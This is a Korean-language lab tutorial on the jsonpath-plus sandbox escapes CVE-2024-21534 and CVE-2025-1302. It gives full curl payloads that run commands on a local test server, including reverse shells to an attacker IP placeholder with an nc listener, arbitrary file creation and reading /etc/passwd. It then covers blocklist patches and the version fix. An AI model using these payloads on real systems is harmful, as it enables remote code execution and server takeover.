## 취약점 테스트

### 정상적인 검색 테스트

<CodeBlock
  code={`curl -X POST http://localhost:3000/search \\
  -H "Content-Type: application/json" \\
  -d '{"query": "$.299"}'`}
  id="test-1"
/>

**예상 결과:** 299의 검색 결과와 $.299 표현식 결과가 동일

---

### 악의적인 표현식 삽입

**1. 먼저 리스너 실행:**

<CodeBlock code="nc -lvnp 4444" id="test-2" />

**2. Reverse Shell 획득:**

<CodeBlock
  code={`curl -X POST http://localhost:3000/search \\
  -H "Content-Type: application/json" \\
  -d '{"query": "$[?(EQST=this.constructor.constructor(\\"process.mainModule.require('child_process').execSync('bash -c '\\''bash >& /dev/tcp/<공격자_IP>/4444 0>&1'\\''')\\");EQST())]"}'`}
  id="test-3"
/>

> ⚠️ `<공격자_IP>`를 실제 Kali IP로 변경

---

## Step 1. CVE-2024-21534 분석

### JSONPath 표현식 처리 과정

```
JSONPath 함수 →
evaluate 함수 →
_trace 함수 →
_eval 함수 →
vm.runInNewContext()
```

---

### Sandbox 탈출

**원리:**

<CodeBlock code="this.constructor.constructor('코드')" id="step1-1" />

- `this`: Object인 sandbox
- `this.constructor`: Object의 생성자
- `constructor.constructor`: Function 생성자

---

### 실습: 임의 파일 생성

<CodeBlock
  code={`curl -X POST http://localhost:3000/search \\
  -H "Content-Type: application/json" \\
  -d '{"query": "$[?(EQST=this.constructor.constructor(\\"process.mainModule.require('child_process').execSync('touch /tmp/EQST.txt')\\");EQST())]"}'`}
  id="step1-2"
/>

**확인:**

<CodeBlock code="ls -la /tmp/EQST.txt" id="step1-3" />

---

## Step 2. CVE-2024-21534 보안 조치

### 1) 실행 방식 변경

<CodeBlock
  code={`// keyMap 검증 추가
if (!keyMap.hasOwnProperty(prop)) {
  throw new Error('Invalid property access');
}`}
  id="step2-1"
/>

**문제점:** bind, apply, call 등 내장 함수로 우회 가능

---

## 2) Object 내장 함수 제거

<CodeBlock
  code={`const keyMap = Object.create(null);
Object.assign(keyMap, context);`}
  id="step2-2"
/>

**효과:** prototype이 없는 빈 객체 생성

---

### 3) 필터링 추가

<CodeBlock 
  code={`const BLOCKED = new Set([
  'constructor',
  '__proto__',
  'prototype'
]);

if (BLOCKED.has(prop)) {
throw new Error('Blocked');
}`}
id="step2-3"
/>

---

## Step 3. CVE-2025-1302 우회

### 우회 원리

**2024 표현식:**

```
[].constructor.constructor
→ prop: "constructor" (string) → 차단됨
```

**2025 표현식:**

```
''[['constructor']][['constructor']]
→ prop: ["constructor"] (object) → 우회 성공
```

---

### 실습: /etc/passwd 읽기

<CodeBlock
  code={`curl -X POST http://localhost:3000/search \\
  -H "Content-Type: application/json" \\
  -d '{"query": "$..[?(EQST='\\''\\''[['\\''constructor'\\'']]['\\''constructor'\\'']](\\\"this.process.mainModule.require('\\''child_process'\\'').execSync(\\\`cat /etc/passwd\\\`)\\");EQST())]"}'`}
  id="step3-1"
/>

---

### 실습: Reverse Shell

<CodeBlock
  code={`curl -X POST http://localhost:3000/search \\
  -H "Content-Type: application/json" \\
  -d '{"query": "$..[?(EQST='\\''\\''[['\\''constructor'\\'']]['\\''constructor'\\'']](\\\"this.process.mainModule.require('\\''child_process'\\'').execSync(\\\\\`bash -c 'bash >& /dev/tcp/<공격자_IP>/4444 0>&1'\\\\\`)\\");EQST())]"}'`}
  id="step3-2"
/>

---

## 대응 방안

### 패치 내용 (2025.02.15)

<CodeBlock 
  code={`const prop = String(propCandidate);

if (BLOCKED.has(prop)) {
throw new Error('Blocked');
}`}
id="solution-1"
/>

**핵심:** prop을 항상 문자열로 변환

---

### 버전 확인 및 업데이트

<CodeBlock code="npm list jsonpath-plus" id="solution-2" />

<CodeBlock code="npm install jsonpath-plus@10.3.0" id="solution-3" />

> ⚠️ v9.0.0 ~ v10.2.0은 취약 버전
